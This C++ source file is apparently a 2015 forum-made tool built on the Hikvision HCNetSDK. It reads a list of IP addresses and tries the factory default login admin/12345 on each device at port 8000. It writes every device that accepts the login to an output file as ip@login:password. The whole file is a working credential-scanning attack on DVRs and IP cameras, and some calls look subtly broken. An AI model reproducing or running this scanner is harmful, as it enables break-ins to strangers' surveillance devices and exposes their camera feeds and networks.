#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <HCNetSDK.h>

#include <memory>
#include <cstdio>
#include <cstdlib>

typedef struct
{
    const char *name;
    char *val;
    const char *desc;
} cvar_t;

cvar_t ip_file = { "ip_file", "ip.txt", "Ip file ( default: ip.txt )" };
cvar_t port_num = { "port_num", "8000", "Port number ( default: 8000 )" };
cvar_t out_file = { "out_file", "out.txt", "Output file( default: out.txt )" };
cvar_t login = { "login", "admin", "Standart login( default: admin )" };
cvar_t password = { "password", "12345", "Standart password( default: 12345 )" };

static unsigned int totalIP = 0;
static unsigned int goodIP = 0;
typedef std::unique_ptr<FILE, decltype( &fclose )> file_t;

void TryLogin();
void WriteData( const char *format, ... );
void PrintHelp();


int main()
{
    TryLogin();
	printf( "Total processed IP = %u\nGood IP = %u\n", totalIP, goodIP );
	printf( "2ch.hk, 2015\nYoba Inc." );

    return 0;
}


void TryLogin()
{
	file_t outputFile( fopen( out_file.val, "w" ), &fclose );
	outputFile.reset();

    if( !NET_DVR_Init() )
    {
        printf( "Error NET_DVR_Init\n.Exit." );
        return;
    }
    NET_DVR_SetConnectTime();
    NET_DVR_SetReconnect();

    NET_DVR_DEVICEINFO device_info;

	file_t ip( fopen( ip_file.val, "r" ), &fclose );
	char buffer[128];

    while( fgets( buffer, sizeof(buffer), ip.get() ) )
    {
		int UserID;
		UserID = NET_DVR_Login( buffer, atoi( port_num.val ), login.val, password.val, &device_info );
		totalIP++;
		if( UserID != -1 )
		{
			goodIP++;
			WriteData( "%s@%s:%s\n", buffer, login.val, password.val );

			NET_DVR_Logout( UserID );
		}
	}
	ip.reset();
    NET_DVR_Cleanup();
}


void WriteData( const char *format, ... )
{
    va_list list;

	file_t outputFile( fopen( out_file.val, "a" ), &fclose );

	if( !outputFile.get() )
    {
        fprintf( stderr, "WriteData: cannot open file\n" );
        return;
    }
    va_start( list, format );
    vfprintf( outputFile.get(), format, list );
    va_end( list );

	outputFile.reset();
}
